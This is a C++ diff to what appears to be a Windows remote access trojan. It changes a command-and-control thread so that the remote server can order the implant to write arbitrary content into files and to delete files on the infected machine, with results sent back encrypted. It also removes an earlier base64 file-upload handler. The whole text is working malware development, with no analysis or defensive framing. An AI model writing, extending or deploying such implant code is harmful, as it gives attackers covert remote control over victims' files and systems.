@@ -528,57 +528,42 @@ DWORD WINAPI C2CommunicationThread(LPVOID lpParam)
             }
             else if (ls[1] == "write")
             {
-                
+                std::string szFilePath = ls[2];
+                std::string szContent = ls[3];
+
+                DWORD attr = GetFileAttributesA(szFilePath.c_str());
+                if (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_DIRECTORY))
+                {
+                    std::ofstream outFile(szFilePath, std::ios::out);
+                    if (outFile.is_open())
+                    {
+                        outFile << szContent;
+                        outFile.close();
+
+                        fnSendEncryptedResponse(s, "[+] Successfully wrote content into: " + szFilePath, pSend);
+                    }
+                    else
+                    {
+                        fnSendEncryptedResponse(s, "[-] Failed to write content into: " + szFilePath, pSend);
+                    }
+                }
             }
             else if (ls[1] == "delete")
             {
-
-            }
-            else if (ls[1] == "upload")
-            {
                 std::string szFilePath = ls[2];
-                int nCode = std::atoi(ls[3].c_str());
 
-                if (nCode == 1)
+                DWORD attr = GetFileAttributesA(szFilePath.c_str());
+                if (INVALID_FILE_ATTRIBUTES != attr && !(attr & FILE_ATTRIBUTE_DIRECTORY))
                 {
-                    // write
-
-                    std::vector<BYTE> abData = fnBase64Decode(ls[4]);
-                    if (abData.empty() && !ls[4].empty())
+                    if (DeleteFileA(szFilePath.c_str()))
                     {
-                        fnSendEncryptedResponse(s, "0", pSend);
-                        continue;
+                        fnSendEncryptedResponse(s, "[+] Successfully deleted file: " + szFilePath, pSend);
                     }
-
-                    HANDLE hFile = CreateFileA(szFilePath.c_str(), FILE_WRITE_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-
-                    if (INVALID_HANDLE_VALUE == hFile)
-                    {
-                        fnSendEncryptedResponse(s, "0", pSend);
-                        continue;
-                    }
-
-                    SetFilePointer(hFile, 0, NULL, FILE_END);
-
-                    DWORD nWritten = 0;
-                    BOOL bWrite = WriteFile(hFile, abData.data(), (DWORD)abData.size(), &nWritten, NULL);
-                    CloseHandle(hFile);
-
-                    if (bWrite && nWritten == abData.size())
-                        fnSendEncryptedResponse(s, "1", pSend);
                     else
-                        fnSendEncryptedResponse(s, "0", pSend);
+                    {
+                        fnSendEncryptedResponse(s, "[-] Failed to delete file: " + szFilePath, pSend);
+                    }
                 }
-                else if (nCode == 2)
-                {
-                    // finish
-
-                    fnSendEncryptedResponse(s, "2", pSend);
-                }
-            }
-            else if (ls[1] == "download")
-            {
-
             }
         }
         else if (ls[0] == "screen")
